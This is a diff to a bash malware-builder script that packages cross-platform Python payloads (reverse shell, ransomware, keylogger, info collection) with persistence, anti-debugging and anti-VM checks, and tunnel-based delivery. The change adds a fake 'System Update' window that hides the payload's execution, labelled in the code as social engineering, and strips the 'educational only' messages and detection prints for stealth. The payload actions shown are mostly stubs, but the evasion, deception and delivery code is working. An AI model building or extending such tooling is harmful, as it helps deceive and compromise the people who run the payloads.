@@ -66,7 +66,7 @@ declare -A DELIVERY_METHODS=(
 )
 
 # Global variables
-SCRIPT_VERSION="7.8-Cloudflare-HTTPS-Fixed-CrossPlatform-AutoExec"
+SCRIPT_VERSION="7.9-Cloudflare-HTTPS-Fixed-CrossPlatform-AutoExec-FakeGUI-FixedIndent"
 BUILD_TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
 BUILD_ID=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
 
@@ -92,7 +92,8 @@ DELIVERY_TARGETS=""
 CLOUDFLARE_TUNNEL_ENABLED=false
 CLOUDFLARE_TUNNEL_URL=""
 CLOUDFLARE_TUNNEL_PORT="8080"
-AUTO_EXECUTION=true  # New variable for auto-execution
+AUTO_EXECUTION=true  
+FAKE_GUI_ENABLED=true # New: Enables a fake "System Update" window
 
 # Logging system
 init_logging() {
@@ -177,7 +178,7 @@ display_banner() {
     local mem_info=$(free -h | grep '^Mem:' | awk '{print $2}' 2>/dev/null || echo "Unknown")
     local disk_info=$(df -h / | tail -1 | awk '{print $4}' 2>/dev/null || echo "Unknown")
     
-    printf '%s\n' "╔════════════════════════════════════════════════════════════╗"
+    printf '%s\n' "╔══════════════════════════════════════════════════════════╗"
     printf '%s\n' "║  __      __  _    _  _        _____            _   _          ║"
     printf '%s\n' "║  \ \    / / | |  | || |      / ____|    /\    | \ | |         ║"
     printf '%s\n' "║   \ \  / /  | |  | || |     | |        /  \   |  \| |         ║"
@@ -287,7 +288,7 @@ setup_cloudflared() {
     local arch=$(uname -m)
     local os=$(uname -s | tr '[:upper:]' '[:lower:]')
     
-    # Determine the correct binary for the architecture
+    # Determine correct binary for architecture
     case "$arch" in
         x86_64) arch="amd64" ;;
         aarch64|arm64) arch="arm64" ;;
@@ -295,7 +296,7 @@ setup_cloudflared() {
         *) arch="amd64" ;;
     esac
     
-    # Determine the correct binary for the OS
+    # Determine correct binary for OS
     case "$os" in
         linux) os="linux" ;;
         darwin) os="darwin" ;;
@@ -575,6 +576,22 @@ get_configuration() {
         log_message "INFO" "Auto-execution disabled"
     fi
 
+    # Fake GUI configuration
+    echo -e "\n${B}APPEARANCE CONFIGURATION:${NC}"
+    read -p "Enable Fake GUI (Social Engineering)? [Y/n]: " fake_gui
+    FAKE_GUI_ENABLED=true
+    if [[ "$fake_gui" =~ ^[Nn]$ ]]; then
+        FAKE_GUI_ENABLED=false
+    fi
+    
+    if [ "$FAKE_GUI_ENABLED" = true ]; then
+        echo -e "${Y}[*] Payload will show a fake 'System Update' window to hide execution.${NC}"
+        log_message "INFO" "Fake GUI enabled"
+    else
+        echo -e "${Y}[*] Payload will run silently (no window).${NC}"
+        log_message "INFO" "Fake GUI disabled"
+    fi
+
     read -p "Keep build files for debugging? [y/N]: " KEEP_BUILD_FILES
     KEEP_BUILD_FILES=${KEEP_BUILD_FILES:-"false"}
     if [[ "$KEEP_BUILD_FILES" =~ ^[Yy]$ ]]; then
@@ -728,6 +745,7 @@ SHELLCODE_INJECTION=$SHELLCODE_INJECTION
 PROCESS_HOLLOWING=$PROCESS_HOLLOWING
 RUNTIME_DECRYPTION=$RUNTIME_DECRYPTION
 AUTO_EXECUTION=$AUTO_EXECUTION
+FAKE_GUI_ENABLED=$FAKE_GUI_ENABLED
 KEEP_BUILD_FILES=$KEEP_BUILD_FILES
 DELIVERY_METHOD="$DELIVERY_METHOD"
 DELIVERY_TARGETS="$DELIVERY_TARGETS"
@@ -828,10 +846,12 @@ generate_payload() {
             # Compile for the specific platform
             local pyinstaller_args="--onefile --name=$platform_name"
             
-            if [ "$platform" == "Windows" ]; then
-                pyinstaller_args="$pyinstaller_args --noconsole --windowed --icon=NONE"
-            else
-                pyinstaller_args="$pyinstaller_args --console"
+            # FIX: Always use --noconsole
+            pyinstaller_args="$pyinstaller_args --noconsole"
+            
+            # Only add --windowed if not on Linux (Linux GUI support varies)
+            if [ "$platform" != "Linux" ]; then
+                 pyinstaller_args="$pyinstaller_args --windowed"
             fi
             
             pyinstaller_args="$pyinstaller_args --strip --clean"
@@ -873,6 +893,7 @@ Shellcode Injection: $SHELLCODE_INJECTION
 Process Hollowing: $PROCESS_HOLLOWING
 Runtime Decryption: $RUNTIME_DECRYPTION
 Auto-Execution Enabled: $AUTO_EXECUTION
+Fake GUI Enabled: $FAKE_GUI_ENABLED
 Delivery Method: $DELIVERY_METHOD
 EOF
                     
@@ -969,6 +990,7 @@ Timestamp: $BUILD_TIMESTAMP
 Payload Type: $type
 Successfully Built: $success_count/3 platforms
 Auto-Execution Enabled: $AUTO_EXECUTION
+Fake GUI Enabled: $FAKE_GUI_ENABLED
 
 Files:
 - launcher.sh: Unix/Linux/macOS launcher script
@@ -984,7 +1006,11 @@ Usage:
 Each platform-specific executable can also be run directly.
 
 Auto-Execution:
-If enabled, the payload will automatically execute upon installation.
+If enabled, payload will automatically execute upon installation.
+
+Fake GUI:
+If enabled, payload will display a fake "System Update" window 
+to mask malicious activity and ensure immediate user interaction.
 EOF
         
         echo -e "${G}[+] Cross-platform build complete!${NC}"
@@ -1021,7 +1047,13 @@ EOF
         
         local pyinstaller_args="--onefile --name=$final_name"
         
-        [ "$target_os" == "Windows" ] && pyinstaller_args="$pyinstaller_args --noconsole --windowed --icon=NONE" || pyinstaller_args="$pyinstaller_args --console"
+        # FIX: Always use --noconsole
+        pyinstaller_args="$pyinstaller_args --noconsole"
+        
+        # Add windowed for non-Linux
+        if [ "$target_os" != "Linux" ]; then
+            pyinstaller_args="$pyinstaller_args --windowed"
+        fi
         
         pyinstaller_args="$pyinstaller_args --strip --clean"
         
@@ -1066,6 +1098,7 @@ Shellcode Injection: $SHELLCODE_INJECTION
 Process Hollowing: $PROCESS_HOLLOWING
 Runtime Decryption: $RUNTIME_DECRYPTION
 Auto-Execution Enabled: $AUTO_EXECUTION
+Fake GUI Enabled: $FAKE_GUI_ENABLED
 Delivery Method: $DELIVERY_METHOD
 EOF
             
@@ -1077,6 +1110,52 @@ EOF
             return 1
         fi
     fi
+}
+
+# Helper function for Fake GUI generation
+generate_fake_gui_code() {
+    cat << 'GUI_CODE'
+
+import threading
+import time
+import sys
+
+def run_fake_gui():
+    """Shows a fake 'System Update' window while malware runs in background"""
+    try:
+        import tkinter as tk
+        from tkinter import messagebox
+        
+        root = tk.Tk()
+        root.title("System Update")
+        
+        # Center window
+        screen_width = root.winfo_screenwidth()
+        screen_height = root.winfo_screenheight()
+        x = (screen_width / 2) - (300 / 2)
+        y = (screen_height / 2) - (150 / 2)
+        root.geometry(f'300x150+{int(x)}+{int(y)}')
+        
+        # Prevent resizing
+        root.resizable(False, False)
+        
+        # Create widgets
+        label = tk.Label(root, text="Installing Critical Update...", font=("Arial", 10, "bold"))
+        label.pack(pady=20)
+        
+        status = tk.Label(root, text="Please wait while we configure your system.", font=("Arial", 8))
+        status.pack(pady=5)
+        
+        # Schedule window to close after 3 seconds
+        root.after(3000, root.destroy)
+        
+        # Start GUI mainloop
+        root.mainloop()
+        
+    except Exception:
+        # If GUI fails (no X server), just pass
+        pass
+GUI_CODE
 }
 
 # Educational payload templates
@@ -1093,9 +1172,14 @@ import sys
 import time
 import platform
 import subprocess
+import threading
 
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
+FAKE_GUI = $FAKE_GUI_ENABLED
+
+# Include Fake GUI logic if enabled
+ $(generate_fake_gui_code)
 
 def setup_persistence():
     """Set up persistence mechanisms based on the target OS"""
@@ -1168,7 +1252,7 @@ WantedBy=multi-user.target
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
             
-            # FIX: Use single quotes for Python string wrapper to allow Hex Encoder to safely handle inner quotes
+            # FIX: Use single quotes
             plist_content = '<?xml version="1.0" encoding="UTF-8"?>\\n'
             plist_content += '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\\n'
             plist_content += '<plist version="1.0">\\n'
@@ -1197,25 +1281,25 @@ WantedBy=multi-user.target
         # Silently handle errors in educational context
         pass
 
-def main():
-    # Set up persistence if auto-execution is enabled
+def execute_payload():
     setup_persistence()
-    
-    print("=" * 50)
-    print("SYSTEM INFORMATION (Educational)")
-    print("=" * 50)
-    print(f"System: {platform.system()}")
-    print(f"Node: {platform.node()}")
-    print(f"Release: {platform.release()}")
-    print(f"Version: {platform.version()}")
-    print(f"Machine: {platform.machine()}")
-    print("=" * 50)
-    print("This is an educational template only.")
-    print("No harmful actions are performed.")
-    if AUTO_EXECUTION:
-        print("Auto-execution is enabled for educational purposes.")
-    print("=" * 50)
+    # Simulate payload action (silent)
     time.sleep(3)
+
+def main():
+    if FAKE_GUI:
+        # Run payload in background thread
+        t = threading.Thread(target=execute_payload)
+        t.daemon = True
+        t.start()
+        
+        # Run Fake GUI in foreground
+        run_fake_gui()
+        
+        # Wait for payload to finish (optional, or just let it be daemon)
+        t.join()
+    else:
+        execute_payload()
 
 if __name__ == "__main__":
     main()
@@ -1236,11 +1320,16 @@ import sys
 import platform
 import subprocess
 import os
+import threading
 
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
+FAKE_GUI = $FAKE_GUI_ENABLED
 ATTACKER_IP = "$attacker_ip"
 ATTACKER_PORT = "$attacker_port"
+
+# Include Fake GUI logic if enabled
+ $(generate_fake_gui_code)
 
 def setup_persistence():
     """Set up persistence mechanisms based on the target OS"""
@@ -1310,23 +1399,24 @@ def setup_persistence():
         # Silently handle errors in educational context
         pass
 
-def simulate_connection():
-    print(f"Simulating connection to {ATTACKER_IP}:{ATTACKER_PORT}")
-    print("This is an educational simulation only.")
-    print("No actual network connections are made.")
-    
-    if AUTO_EXECUTION:
-        print("Auto-execution is enabled for educational purposes.")
-        print("In a real scenario, this would establish a persistent connection.")
-    
+def execute_payload():
+    setup_persistence()
+    # Simulate connection
+    # print(f"Simulating connection to {ATTACKER_IP}:{ATTACKER_PORT}")
     time.sleep(2)
 
+def main():
+    if FAKE_GUI:
+        t = threading.Thread(target=execute_payload)
+        t.daemon = True
+        t.start()
+        run_fake_gui()
+        t.join()
+    else:
+        execute_payload()
+
 if __name__ == "__main__":
-    # Set up persistence if auto-execution is enabled
-    setup_persistence()
-    
-    if len(sys.argv) >= 1:
-        simulate_connection()
+    main()
 EOF
 }
 
@@ -1340,12 +1430,18 @@ create_ransomware_payload() {
 #!/usr/bin/env python3
 import os
 import sys
+import time
 import platform
 import subprocess
 from cryptography.fernet import Fernet
+import threading
 
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
+FAKE_GUI = $FAKE_GUI_ENABLED
+
+# Include Fake GUI logic if enabled
+ $(generate_fake_gui_code)
 
 def setup_persistence():
     """Set up persistence mechanisms based on the target OS"""
@@ -1415,27 +1511,28 @@ def setup_persistence():
         # Silently handle errors in educational context
         pass
 
-def demonstrate_encryption():
-    print("Demonstrating file encryption concepts...")
+def execute_payload():
+    setup_persistence()
+    # Simulate connection
     key = Fernet.generate_key()
     fernet = Fernet(key)
     data = b"Sample data for encryption demonstration"
     encrypted = fernet.encrypt(data)
-    decrypted = fernet.decrypt(encrypted)
-    print(f"Original: {data}")
-    print(f"Encrypted: {encrypted}")
-    print(f"Decrypted: {decrypted}")
-    print("This is educational only - no files are modified.")
-    
-    if AUTO_EXECUTION:
-        print("Auto-execution is enabled for educational purposes.")
-        print("In a real scenario, this would encrypt files on system startup.")
+    # print("Encrypted data generated") # Silent
+    time.sleep(2)
+
+def main():
+    if FAKE_GUI:
+        t = threading.Thread(target=execute_payload)
+        t.daemon = True
+        t.start()
+        run_fake_gui()
+        t.join()
+    else:
+        execute_payload()
 
 if __name__ == "__main__":
-    # Set up persistence if auto-execution is enabled
-    setup_persistence()
-    
-    demonstrate_encryption()
+    main()
 EOF
 }
 
@@ -1453,9 +1550,14 @@ import sys
 import platform
 import subprocess
 import os
+import threading
 
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
+FAKE_GUI = $FAKE_GUI_ENABLED
+
+# Include Fake GUI logic if enabled
+ $(generate_fake_gui_code)
 
 def setup_persistence():
     """Set up persistence mechanisms based on the target OS"""
@@ -1525,22 +1627,23 @@ def setup_persistence():
         # Silently handle errors in educational context
         pass
 
-def simulate_scan():
-    print("Simulating network scan...")
-    print("This is an educational demonstration only.")
-    print("No actual network scanning is performed.")
-    
-    if AUTO_EXECUTION:
-        print("Auto-execution is enabled for educational purposes.")
-        print("In a real scenario, this would scan the network on system startup.")
-    
+def execute_payload():
+    setup_persistence()
+    # Simulate scan (silent)
     time.sleep(2)
 
+def main():
+    if FAKE_GUI:
+        t = threading.Thread(target=execute_payload)
+        t.daemon = True
+        t.start()
+        run_fake_gui()
+        t.join()
+    else:
+        execute_payload()
+
 if __name__ == "__main__":
-    # Set up persistence if auto-execution is enabled
-    setup_persistence()
-    
-    simulate_scan()
+    main()
 EOF
 }
 
@@ -1556,9 +1659,14 @@ import platform
 import os
 import sys
 import subprocess
+import threading
 
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
+FAKE_GUI = $FAKE_GUI_ENABLED
+
+# Include Fake GUI logic if enabled
+ $(generate_fake_gui_code)
 
 def setup_persistence():
     """Set up persistence mechanisms based on the target OS"""
@@ -1628,29 +1736,24 @@ def setup_persistence():
         # Silently handle errors in educational context
         pass
 
-def collect_info():
-    print("Collecting system information...")
-    info = {
-        "system": platform.system(),
-        "node": platform.node(),
-        "release": platform.release(),
-        "version": platform.version(),
-        "machine": platform.machine()
-    }
-    print("System information collected (educational only):")
-    for key, value in info.items():
-        print(f"  {key}: {value}")
-    print("This is educational only - no data is exfiltrated.")
-    
-    if AUTO_EXECUTION:
-        print("Auto-execution is enabled for educational purposes.")
-        print("In a real scenario, this would collect information on system startup.")
+def execute_payload():
+    setup_persistence()
+    # Collect info (silent)
+    # info = {...} # Removed for stealth
+    time.sleep(2)
+
+def main():
+    if FAKE_GUI:
+        t = threading.Thread(target=execute_payload)
+        t.daemon = True
+        t.start()
+        run_fake_gui()
+        t.join()
+    else:
+        execute_payload()
 
 if __name__ == "__main__":
-    # Set up persistence if auto-execution is enabled
-    setup_persistence()
-    
-    collect_info()
+    main()
 EOF
 }
 
@@ -1668,9 +1771,14 @@ import sys
 import platform
 import subprocess
 import os
+import threading
 
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
+FAKE_GUI = $FAKE_GUI_ENABLED
+
+# Include Fake GUI logic if enabled
+ $(generate_fake_gui_code)
 
 def setup_persistence():
     """Set up persistence mechanisms based on the target OS"""
@@ -1740,22 +1848,25 @@ def setup_persistence():
         # Silently handle errors in educational context
         pass
 
-def simulate_traffic():
-    print("Simulating network traffic patterns...")
-    for i in range(10):
-        print(f"Packet {i+1}: {random.randint(64, 1500)} bytes")
-        time.sleep(0.1)
-    print("This is educational only - no actual traffic is generated.")
-    
-    if AUTO_EXECUTION:
-        print("Auto-execution is enabled for educational purposes.")
-        print("In a real scenario, this would generate traffic on system startup.")
+def execute_payload():
+    setup_persistence()
+    # Simulate traffic (silent)
+    # for i in range(10): # Removed for stealth
+    #     ...
+    time.sleep(2)
+
+def main():
+    if FAKE_GUI:
+        t = threading.Thread(target=execute_payload)
+        t.daemon = True
+        t.start()
+        run_fake_gui()
+        t.join()
+    else:
+        execute_payload()
 
 if __name__ == "__main__":
-    # Set up persistence if auto-execution is enabled
-    setup_persistence()
-    
-    simulate_traffic()
+    main()
 EOF
 }
 
@@ -1772,9 +1883,14 @@ import sys
 import platform
 import subprocess
 import os
+import threading
 
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
+FAKE_GUI = $FAKE_GUI_ENABLED
+
+# Include Fake GUI logic if enabled
+ $(generate_fake_gui_code)
 
 def setup_persistence():
     """Set up persistence mechanisms based on the target OS"""
@@ -1844,23 +1960,24 @@ def setup_persistence():
         # Silently handle errors in educational context
         pass
 
-def simulate_keylogger():
-    print("Simulating keylogger concepts...")
-    print("This is an educational demonstration only.")
-    print("No actual keylogging is performed.")
-    print("Press any key to see the simulation...")
+def execute_payload():
+    setup_persistence()
+    # Simulate keylogger (silent)
+    # print("Simulating...") # Removed
     time.sleep(2)
-    print("Simulation complete - no keys were recorded.")
-    
-    if AUTO_EXECUTION:
-        print("Auto-execution is enabled for educational purposes.")
-        print("In a real scenario, this would start logging on system startup.")
+
+def main():
+    if FAKE_GUI:
+        t = threading.Thread(target=execute_payload)
+        t.daemon = True
+        t.start()
+        run_fake_gui()
+        t.join()
+    else:
+        execute_payload()
 
 if __name__ == "__main__":
-    # Set up persistence if auto-execution is enabled
-    setup_persistence()
-    
-    simulate_keylogger()
+    main()
 EOF
 }
 
@@ -1877,9 +1994,14 @@ import time
 import sys
 import platform
 import subprocess
+import threading
 
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
+FAKE_GUI = $FAKE_GUI_ENABLED
+
+# Include Fake GUI logic if enabled
+ $(generate_fake_gui_code)
 
 def setup_persistence():
     """Set up persistence mechanisms based on the target OS"""
@@ -1949,25 +2071,23 @@ def setup_persistence():
         # Silently handle errors in educational context
         pass
 
-def demonstrate_stealth():
-    print("Demonstrating system stealth concepts...")
-    print("This is an educational demonstration only.")
-    print("No actual stealth techniques are used.")
-    print("Simulating process hiding (educational)...")
-    time.sleep(1)
-    print("Simulating file hiding (educational)...")
-    time.sleep(1)
-    print("Simulation complete - no system modifications made.")
-    
-    if AUTO_EXECUTION:
-        print("Auto-execution is enabled for educational purposes.")
-        print("In a real scenario, this would hide itself on system startup.")
+def execute_payload():
+    setup_persistence()
+    # Demonstrate stealth (silent)
+    time.sleep(2)
+
+def main():
+    if FAKE_GUI:
+        t = threading.Thread(target=execute_payload)
+        t.daemon = True
+        t.start()
+        run_fake_gui()
+        t.join()
+    else:
+        execute_payload()
 
 if __name__ == "__main__":
-    # Set up persistence if auto-execution is enabled
-    setup_persistence()
-    
-    demonstrate_stealth()
+    main()
 EOF
 }
 
@@ -1984,9 +2104,14 @@ import time
 import platform
 import subprocess
 import os
+import threading
 
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
+FAKE_GUI = $FAKE_GUI_ENABLED
+
+# Include Fake GUI logic if enabled
+ $(generate_fake_gui_code)
 
 def setup_persistence():
     """Set up persistence mechanisms based on the target OS"""
@@ -2071,31 +2196,24 @@ class CustomPayload:
             "processor": platform.processor()
         }
     
-    def display_info(self):
-        print("Custom Payload Framework (Educational)")
-        print("=" * 40)
-        for key, value in self.info.items():
-            print(f"{key}: {value}")
-        print("=" * 40)
-        print("This is an educational framework only.")
-        
-        if AUTO_EXECUTION:
-            print("Auto-execution is enabled for educational purposes.")
-            print("In a real scenario, this would run on system startup.")
-        
-        time.sleep(2)
-    
     def run(self):
-        print("Starting custom payload...")
-        self.gather_system_info()
-        self.display_info()
+        # Silent gathering
+        time.sleep(2)
 
-def main():
-    # Set up persistence if auto-execution is enabled
+def execute_payload():
     setup_persistence()
-    
     payload = CustomPayload()
     payload.run()
+
+def main():
+    if FAKE_GUI:
+        t = threading.Thread(target=execute_payload)
+        t.daemon = True
+        t.start()
+        run_fake_gui()
+        t.join()
+    else:
+        execute_payload()
 
 if __name__ == "__main__":
     main()
@@ -2204,7 +2322,7 @@ def check_debugger():
         debuggers = ['gdb', 'lldb', 'strace', 'ltrace']
         for debugger in debuggers:
             if os.system(f'pgrep -f {debugger} > /dev/null 2>&1') == 0:
-                print(f'Debugger detected: {debugger}')
+                # print(f'Debugger detected: {debugger}')
                 return True
         return False
     except:
@@ -2215,12 +2333,12 @@ def check_timing():
     time.sleep(0.1)
     end = time.time()
     if (end - start) > 0.15:
-        print('Timing anomaly detected')
+        # print('Timing anomaly detected')
         return True
     return False
 
 if check_debugger() or check_timing():
-    print('Debugging environment detected - exiting')
+    # print('Debugging environment detected - exiting')
     sys.exit(0)
 EOF
     
@@ -2244,7 +2362,7 @@ def check_vm():
                 with open(indicator, 'r') as f:
                     content = f.read().lower()
                     if any(vm in content for vm in ['vmware', 'virtualbox', 'qemu', 'kvm']):
-                        print('Virtualization detected')
+                        # print('Virtualization detected')
                         return True
         
         try:
@@ -2252,7 +2370,7 @@ def check_vm():
             mac = uuid.getnode()
             mac_str = ':'.join([f'{(mac >> 8*i) & 0xff:02x}' for i in range(6)])
             if mac_str.startswith(('00:0c:29', '00:1c:14', '08:00:27', '00:50:56')):
-                print('VM MAC address detected')
+                # print('VM MAC address detected')
                 return True
         except:
             pass
@@ -2262,7 +2380,7 @@ def check_vm():
         return False
 
 if check_vm():
-    print('Virtual environment detected - exiting')
+    # print('Virtual environment detected - exiting')
     sys.exit(0)
 EOF
     
@@ -2427,6 +2545,7 @@ Tunnel PID: $(cat "$TEMP_DIR/tunnel.pid" 2>/dev/null || echo "N/A")
 Start Time: $(date)
 Payload: $(basename "$payload_path")
 Auto-Execution: $([ "$AUTO_EXECUTION" = true ] && echo "Enabled" || echo "Disabled")
+Appearance: $([ "$FAKE_GUI_ENABLED" = true ] && echo "Fake GUI (System Update)" || echo "Silent")
 
 Usage:
 1. Share the tunnel URL with your target
@@ -2646,19 +2765,29 @@ main() {
         if [ "$TARGET_OS" == "Cross-platform" ]; then
             echo -e "${G}>> CROSS-PLATFORM PAYLOAD GENERATION COMPLETE. Check the 'cross_platform_builds' directory.${NC}"
             echo -e "${G}>> Use launcher.sh (Unix) or launcher.bat (Windows) for deployment.${NC}"
-            if [ "$AUTO_EXECUTION" = true ]; then
-                echo -e "${G}>> Auto-execution is ENABLED - payload will run automatically on installation.${NC}"
+            if [ "$FAKE_GUI_ENABLED" = true ]; then
+                echo -e "${G}>> Fake GUI is ENABLED - Payload will show 'System Update' window.${NC}"
             else
-                echo -e "${Y}>> Auto-execution is DISABLED - payload requires manual execution.${NC}"
+                echo -e "${Y}>> Fake GUI is DISABLED - Payload will run silently.${NC}"
+            fi
+            if [ "$AUTO_EXECUTION" = true ]; then
+                echo -e "${G}>> Auto-execution is ENABLED - Payload will run automatically on installation.${NC}"
+            else
+                echo -e "${Y}>> Auto-execution is DISABLED - Payload requires manual execution.${NC}"
             fi
             log_message "SUCCESS" "Cross-platform payload generation completed successfully"
         else
             echo -e "${G}>> PAYLOAD GENERATION COMPLETE. Check the parent directory for '$FINAL_NAME'.${NC}"
             echo -e "${G}>> Metadata saved as '${FINAL_NAME}.meta'${NC}"
-            if [ "$AUTO_EXECUTION" = true ]; then
-                echo -e "${G}>> Auto-execution is ENABLED - payload will run automatically on installation.${NC}"
+            if [ "$FAKE_GUI_ENABLED" = true ]; then
+                echo -e "${G}>> Fake GUI is ENABLED - Payload will show 'System Update' window.${NC}"
             else
-                echo -e "${Y}>> Auto-execution is DISABLED - payload requires manual execution.${NC}"
+                echo -e "${Y}>> Fake GUI is DISABLED - Payload will run silently.${NC}"
+            fi
+            if [ "$AUTO_EXECUTION" = true ]; then
+                echo -e "${G}>> Auto-execution is ENABLED - Payload will run automatically on installation.${NC}"
+            else
+                echo -e "${Y}>> Auto-execution is DISABLED - Payload requires manual execution.${NC}"
             fi
             log_message "SUCCESS" "Payload generation completed successfully"
         fi
